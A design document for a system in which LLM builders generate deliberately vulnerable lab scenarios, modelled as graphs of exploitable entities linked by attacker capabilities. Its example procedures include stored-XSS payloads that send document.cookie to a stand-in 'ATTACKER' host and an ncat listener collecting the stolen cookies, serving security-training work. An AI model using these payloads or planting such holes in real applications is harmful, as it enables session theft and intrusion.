# GoE Rewrite [Entity Graph Model]

GoE v2 represents scenarios as a directed graph of **entities** (exploitable vulnerabilities) connected by **typed edges** (attacker capabilities), deployed onto **systems** (infrastructure).

## Core Objects

### System
Infrastructure that entities inhabit. Not exploitable — just deployment targets.
```python
@dataclass
class System:
	id: str
	os: str                     # "ubuntu_22.04"
	services: list[str]         # ["apache2", "mysql", "ssh"]
	network: dict               # {"ip": "10.0.1.2", "ports": [22, 80, 3306]}
```

### Entity
An exploitable vulnerability or misconfiguration. Described in natural language. Each entity declares what it requires (incoming edges) and what it provides (outgoing edges). The builder generates an implementation that satisfies these contracts, using atoms as reference if provided.
```python
@dataclass
class Entity:
	id: str
	atoms: list[Atom]           # Atoms used to implement this entity (optional, for builder reference)
	description: str            # Natural language: The LLM decides implementation, using atoms as reference if provided
	system_id: str              # Which System this lives on
	requires: list[Edge]        # Typed edges this entity needs to be reachable
	provides: list[Edge]        # Typed edges a successful exploit produces
	app_spec: AppSpec | None    # If set, builder generates a custom application
```

### Edge
Typed, parameterized contract between entities. Closed vocabulary, machine-verifiable.
```python
@dataclass
class Edge:
  from_entity: str            # Entity ID or "operator" for external attacker
  to_entity: str              # Entity ID
  type: str                   # Edge type from vocabulary (e.g. "network_reach", "shell_as")
```

### Operator
Special source node (external attacker). Entities whose *only* requirement is `network_reach` from operator are **initial access points**.

## Edge Type Vocabulary

| Type | Params | Meaning |
|------|--------|---------|
| `shell_as` | user, host | Interactive shell |
| `creds_for` | user, host | Known username + password/key |
| `db_session` | db_type, host | Authenticated DB connection |
| `file_read` | path, host | Can read a file |
| `file_write` | path, host | Can write a file |
| `network_reach` | host, port | Can send packets to a service |
| `code_exec` | context, host | RCE within a runtime |
| `token_for` | service, host | Session cookie, JWT, API key |

Routing params (host, user, port) are exact identifiers. Content params (path, context) are descriptive — resolved at build time.

## Custom Apps

Entities that need a generated custom application carry an `app_spec`:
```python
@dataclass
class AppSpec:
    runtime: str                # "express", "flask", "apache_php"
    atoms: list[Atom]            # Atom IDs used in this app (optional, for builder reference)
    vulnerabilities: list[str]  # Vulnerabilities (xss_stored) OR misconfigurations (csp_misconfig)
    goal: str                   # Natural language: what the exploit achives
```

## Procedure (Builder Output)

The builder generates the app **and** a concrete attack procedure specific to what it built. Procedures are dynamic per-entity, not templated. This is critical for custom apps where endpoints and payloads vary.

```yaml
procedure:
  - step: inject
    method: "POST /api/reviews"
    body: {"text": "<script>fetch('http://ATTACKER:9999?c='+document.cookie)</script>"}
  - step: trigger
    method: browser
    url: "http://target:3000/product/1"
    actor: admin_bot
  - step: receive
    method: listen
    port: 9999
    expect: "session_id=..."
  - step: verify
    method: "GET /admin/dashboard"
    headers: {"Cookie": "session_id=..."}
    expect_status: 200
```

The procedure is dynamic and per-entity — not templated. This is critical for custom apps where the builder decides endpoints, payloads, and flow. The test agent receives this procedure and executes it literally.

## Graph Relationships

- Inter-system edges = attacker moves between hosts. Each side is a separate entity with matching edge types.
- Intra-app complexity (e.g., multi-step XSS) = one entity with an internal procedure. The graph only sees inputs and outputs — the steps happen inside one builder's scope.

## Atoms

Atoms are **reference material for builders**, not orchestration units. Builders read atoms to understand techniques. Atoms improve quality but aren't required. The LLM can generate without one for novel scenarios.

## Static Validation

Typed edges allow chain validation before building: verify every entity's `requires` is satisfied by an incoming edge. Catches broken chains in milliseconds.

## Build Flow

1. **Planner** user request -> typed entity graph
2. **Static validation**: verify edge type matching
3. **Builders** (per entity, parallelizable): entity + atoms -> app code + procedure + deploy script
4. **Test agents** (per entity): execute procedure, report pass/fail
5. **Chain test** (if multi-system): deploy full topology, walk edges end-to-end

## Example

```yaml
systems:
  - id: webserver
    os: ubuntu_22.04
    services: [nginx, node, mysql]
  - id: db_server
    os: ubuntu_22.04
    services: [ssh, postgresql]

entities:
  - id: vuln_webapp
    description: "E-commerce app with stored XSS in product reviews"
    system_id: webserver
    requires: [network_reach(webserver, 80)]
    provides: [token_for(admin, webserver)]
    app_spec: { runtime: express, vulnerabilities: [xss_stored], goal: "steal admin session cookie" }

  - id: admin_panel_rce
    description: "Admin panel file upload allows arbitrary PHP execution"
    system_id: webserver
    requires: [token_for(admin, webserver)]
    provides: [shell_as(www-data, webserver)]

  - id: db_creds_in_config
    description: "DB credentials in plaintext config readable by www-data"
    system_id: webserver
    requires: [shell_as(www-data, webserver)]
    provides: [creds_for(dbadmin, db_server)]

  - id: ssh_to_db
    description: "PostgreSQL admin reuses password for SSH"
    system_id: db_server
    requires: [creds_for(dbadmin, db_server)]
    provides: [shell_as(dbadmin, db_server)]

edges:
  - { from: operator, to: vuln_webapp, type: network_reach, params: {host: webserver, port: 80} }
  - { from: vuln_webapp, to: admin_panel_rce, type: token_for, params: {service: admin, host: webserver} }
  - { from: admin_panel_rce, to: db_creds_in_config, type: shell_as, params: {user: www-data, host: webserver} }
  - { from: db_creds_in_config, to: ssh_to_db, type: creds_for, params: {user: dbadmin, host: db_server} }
```

### Graph Visualization

```
                         [webserver]                              [db_server]
                 ┌────────────────────────────────┐          ┌─────────────────┐
                 │                                │          │                 │
 ┌──────────┐    │  ┌─────────────┐   token_for   │          │                 │
 │ OPERATOR │────┼─>│ vuln_webapp │────────────┐  │          │                 │
 └──────────┘    │  └─────────────┘            │  │          │                 │
  network_reach  │                             v  │          │                 │
  :80            │              ┌────────────────┐|          │                 │
                 │              │admin_panel_rce ││          │                 │
                 │              └────────────────┘|          │                 │
                 │                    │ shell_as  |          │                 │
                 │                    v (www-data)|          │                 │
                 │              ┌────────────────┐|          │                 │
                 │              │db_creds_in_conf││          │                 │
                 │              └────────────────┘|          │                 │
                 │                    │           │          │                 │
                 └────────────────────┼───────────┘          │                 │
                                      │ creds_for            │  ┌───────────┐  │
                                      │ (dbadmin)            │  │ ssh_to_db │  │
                                      └──────────────────────┼─>│           │  │
                                                             │  └───────────┘  │
                                                             │   provides:     │
                                                             │   shell_as      │
                                                             │   (dbadmin)     │
                                                             └─────────────────┘
```

### Sample Procedure (vuln_webapp builder output)

The builder for `vuln_webapp` generates the Express app and produces this concrete procedure for the test agent:

```yaml
app_source: app.js
procedure:
  - step: setup_listener
    actor: attacker
    method: "ncat -lk 9999 > /tmp/stolen_cookies &"
    context: attacker_shell

  - step: inject_payload
    actor: attacker
    method: "POST http://webserver:3000/api/reviews"
    headers: {"Content-Type": "application/json"}
    body: |
      {
        "product_id": 1,
        "rating": 5,
        "text": "<img src=x onerror=\"fetch('http://ATTACKER:9999/steal?c='+document.cookie)\">"
      }
    expect_status: 201

  - step: trigger_admin_bot
    actor: admin_bot
    method: browser
    url: "http://webserver:3000/products/1"
    wait: 3000
    note: "Admin bot visits product page, renders stored review, XSS fires in admin session"

  - step: capture_cookie
    actor: attacker
    method: "cat /tmp/stolen_cookies"
    context: attacker_shell
    expect_contains: "session_id="

  - step: verify_session_theft
    actor: attacker
    method: "GET http://webserver:3000/admin/dashboard"
    headers: {"Cookie": "${captured_session_id}"}
    expect_status: 200
    expect_body_contains: "Admin Dashboard"
```
